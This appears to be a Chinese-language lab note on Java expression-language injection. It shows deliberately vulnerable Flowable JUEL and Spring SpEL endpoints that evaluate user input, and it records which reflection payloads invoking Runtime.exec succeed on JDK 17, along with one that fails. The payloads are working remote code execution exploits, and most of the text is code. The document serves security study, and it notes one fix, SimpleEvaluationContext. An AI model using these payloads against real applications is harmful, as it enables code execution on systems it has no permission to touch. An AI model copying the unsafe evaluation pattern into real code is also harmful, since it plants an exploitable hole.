### JUEL
后端代码：
```java
import org.flowable.common.engine.api.variable.VariableContainer;
import org.flowable.engine.impl.el.ProcessExpressionManager;

    @RequestMapping("/juel")
    public String juel(String expression) {
//        String payload = "${''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"notepad\")')}";

        Object result = new ProcessExpressionManager().createExpression(expression).getValue(new VariableContainer() {
            @Override
            public boolean hasVariable(String s) {
                return false;
            }

            @Override
            public Object getVariable(String s) {
                return null;
            }

            @Override
            public void setVariable(String s, Object o) {

            }

            @Override
            public void setTransientVariable(String s, Object o) {

            }

            @Override
            public String getTenantId() {
                return null;
            }
        });

        return result.toString();
    }
```
JDK 17
```
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('notepad')}
```

失败。报错：
```
org.flowable.common.engine.impl.javax.el.MethodNotFoundException: Method not found: class java.lang.Class.getRuntime()
```

再使用：
```
${''.getClass().forName('java.lang.Runtime').getMethods()[0].invoke(''.getClass().forName('java.lang.Runtime')).exec('notepad')}
${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('notepad')}
```
成功。


### EL表达式
后端代码:
```java
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

    @RequestMapping("/el")
    public String el(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }
```

使用：
```
''.getClass().forName('java.lang.Runtime').getRuntime().exec('notepad')
''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('notepad')
''.getClass().forName('java.lang.Runtime').getMethods()[0].invoke(''.getClass().forName('java.lang.Runtime')).exec('notepad')
```
成功。
